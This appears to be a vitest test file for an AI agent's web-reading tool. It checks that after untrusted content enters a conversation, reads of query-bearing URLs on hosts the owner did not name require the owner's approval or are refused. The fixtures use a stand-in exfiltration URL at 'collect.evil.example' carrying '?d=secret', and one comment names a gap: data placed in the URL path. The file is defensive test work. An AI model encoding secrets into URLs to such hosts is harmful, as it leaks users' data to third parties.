import { describe, it, expect, vi } from 'vitest';
import type { ToolEntry, PromptMeta, PromptText } from '../../types/index.js';

/**
 * `web_research` `read` once foreign content is in the conversation: a URL with a query goes
 * through the same origin check as a send (asked in the owner's chat, refused where nobody can
 * be asked), unless its host is one the owner named. Without the latch, and for a URL without a
 * query, a read stays a read. The declaration under test is the tool's own
 * (`createWebSearchTool`); only its handler is replaced, so no request leaves the test.
 */

vi.mock('@anthropic-ai/sdk', () => {
  class MockAnthropic { beta = { messages: { stream: vi.fn() } }; }
  class APIError extends Error {}
  return { default: MockAnthropic, APIError };
});
vi.mock('../../core/stream.js', () => ({ StreamProcessor: vi.fn() }));

import { Agent } from '../../core/agent.js';
import { OwnerKnownTargets } from '../../core/owner-known-targets.js';
import { ConversationLatch } from '../../core/conversation-latch.js';
import { flattenPrompt } from '../../core/prompt-value.js';
import { createWebSearchTool, readUrlHasQuery } from './web-search-tool.js';
import type { SearchProvider } from './search-provider.js';

type Result = { content: unknown; is_error?: boolean };
type Exec = { _executeOneInner(tc: unknown): Promise<Result> };

/** The real web_research entry with a handler that only records the URL it would read. */
function webResearch(): ToolEntry & { reads: string[] } {
  const real = createWebSearchTool({} as SearchProvider) as ToolEntry<{ action: string; url?: string }>;
  const reads: string[] = [];
  return {
    ...real,
    reads,
    handler: async (input: { url?: string }) => { reads.push(input.url ?? ''); return 'page'; },
  } as unknown as ToolEntry & { reads: string[] };
}

const owner = (...texts: string[]): OwnerKnownTargets => OwnerKnownTargets.of({ ownerTexts: () => texts });

function asker(answer: string): { fn: (q: string | PromptText, o?: string[], m?: PromptMeta) => Promise<string>; asked: string[] } {
  const asked: string[] = [];
  return { asked, fn: async (q) => { asked.push(flattenPrompt(q)); return answer; } };
}

function agentOf(over: Record<string, unknown>): Agent {
  return new Agent({ name: 'a', model: 'claude-sonnet-4-6', provider: 'anthropic', noticeLanguage: 'en', ...over } as ConstructorParameters<typeof Agent>[0]);
}

/** An agent whose conversation already took in foreign content, as a resumed thread with the record set does. */
function taintedAgentOf(over: Record<string, unknown>): Agent {
  const agent = agentOf({ conversationLatch: ConversationLatch.detached(), ...over });
  agent.restoreConversationTaint();
  return agent;
}

const read = (agent: Agent, url: string): Promise<Result> =>
  (agent as unknown as Exec)._executeOneInner({ type: 'tool_use', id: `t${Math.random()}`, name: 'web_research', input: { action: 'read', url } });

describe('a read URL with a query, after foreign content', () => {
  it('is asked about in the owner\'s chat, names the host, and is not read without a yes', async () => {
    const tool = webResearch();
    const ask = asker('Deny');
    const agent = taintedAgentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner('look up the weather') });
    const result = await read(agent, 'https://collect.evil.example/p?d=secret');
    expect(ask.asked).toHaveLength(1);
    expect(ask.asked[0]).toContain('"collect.evil.example"');
    // The question says what happens: a page is read, and the address goes to the host.
    expect(ask.asked[0]).toMatch(/^Read page: /);
    expect(ask.asked[0]).toContain('Read it anyway? Everything in the address then goes to this host.');
    expect(ask.asked[0]).not.toContain('Send anyway');
    expect(tool.reads).toEqual([]);
    expect(result.is_error).toBe(true);
  });

  it('is read after a yes', async () => {
    const tool = webResearch();
    const ask = asker('Allow');
    const agent = taintedAgentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner('nothing named') });
    await read(agent, 'https://collect.evil.example/p?d=secret');
    expect(ask.asked).toHaveLength(1);
    expect(tool.reads).toEqual(['https://collect.evil.example/p?d=secret']);
  });

  it('is refused in a headless run nobody watches, with no latch record, and nothing is read', async () => {
    const tool = webResearch();
    // A headless workflow step: no conversation latch object at all, only the run's own flags.
    const agent = agentOf({ tools: [tool], autonomy: 'autonomous', sendOrigin: { kind: 'workflowRun', name: 'Abgleich' }, ownerKnown: owner() });
    agent.noteUntrustedData();
    const result = await read(agent, 'https://collect.evil.example/p?d=secret');
    expect(tool.reads).toEqual([]);
    expect(String(result.content)).toContain('the owner did not name "collect.evil.example"');
  });

  it('CONTROL: on a host the owner named is read without a question', async () => {
    const tool = webResearch();
    const ask = asker('Deny');
    const agent = taintedAgentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner('check https://shop.example.ch for prices') });
    await read(agent, 'https://shop.example.ch/search?q=shoes');
    expect(ask.asked).toEqual([]);
    expect(tool.reads).toEqual(['https://shop.example.ch/search?q=shoes']);
  });
});

describe('what stays a plain read', () => {
  it('a URL with a query on a conversation without foreign content: no question, though the read itself arms the latch', async () => {
    const tool = webResearch();
    const ask = asker('Deny');
    const latch = ConversationLatch.detached();
    const agent = agentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner(), conversationLatch: latch });
    await read(agent, 'https://collect.evil.example/p?d=x');
    expect(ask.asked).toEqual([]);
    expect(tool.reads).toEqual(['https://collect.evil.example/p?d=x']);
    // The read took in foreign content, so the NEXT one is checked.
    expect(latch.isSet()).toBe(true);
    await read(agent, 'https://collect.evil.example/p?d=y');
    expect(ask.asked).toHaveLength(1);
    expect(tool.reads).toEqual(['https://collect.evil.example/p?d=x']);
  });

  it('a URL without a query after foreign content: no question (data in the path is not covered)', async () => {
    const tool = webResearch();
    const ask = asker('Deny');
    const agent = taintedAgentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner() });
    await read(agent, 'https://collect.evil.example/secret-in-path#frag=x');
    expect(ask.asked).toEqual([]);
    expect(tool.reads).toEqual(['https://collect.evil.example/secret-in-path#frag=x']);
  });

  it('a search is never declared as a target, even when its input also carries a URL with a query', async () => {
    const real = createWebSearchTool({} as SearchProvider);
    // Even with a URL that carries a query: only `read` fetches it.
    expect(real.sendTargetsWhenLatched?.({ action: 'search', query: 'x', url: 'https://collect.evil.example/?d=x' } as never)).toBeNull();
    expect(real.sendTargets).toBeUndefined();
  });
});

describe('readUrlHasQuery', () => {
  it('sees a query, ignores a fragment and an empty `?`, and counts an unparseable URL as carrying one', () => {
    expect(readUrlHasQuery('https://a.example/p?x=1')).toBe(true);
    expect(readUrlHasQuery('https://a.example/p')).toBe(false);
    expect(readUrlHasQuery('https://a.example/p#q=1')).toBe(false);
    expect(readUrlHasQuery('https://a.example/p?')).toBe(false);
    expect(readUrlHasQuery('not a url')).toBe(true);
  });

  it('an unparseable read URL after foreign content is refused as unreadable, as an address and not a recipient', async () => {
    const tool = webResearch();
    const ask = asker('Allow');
    const agent = taintedAgentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner() });
    const result = await read(agent, 'not a url');
    expect(ask.asked).toEqual([]);
    expect(tool.reads).toEqual([]);
    expect(result.is_error).toBe(true);
    expect(String(result.content)).toContain('could not read the address of this send');
  });
});
